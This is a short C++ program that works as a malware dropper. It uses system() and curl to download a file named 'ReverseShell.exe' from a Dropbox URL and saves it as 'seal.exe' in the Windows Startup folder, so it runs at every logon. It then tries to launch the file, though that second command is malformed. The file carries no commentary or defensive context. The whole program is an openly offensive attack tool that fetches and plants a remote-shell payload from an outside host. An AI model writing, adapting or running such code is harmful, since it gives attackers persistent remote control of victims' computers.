#include <iostream>

int main()
{
    system("curl https://www.dropbox.com/s/jmdz8s4mcyrjczv/ReverseShell.exe?dl=1 --output \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\seal.exe\"");
    system("cd \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"|seal.exe");
}

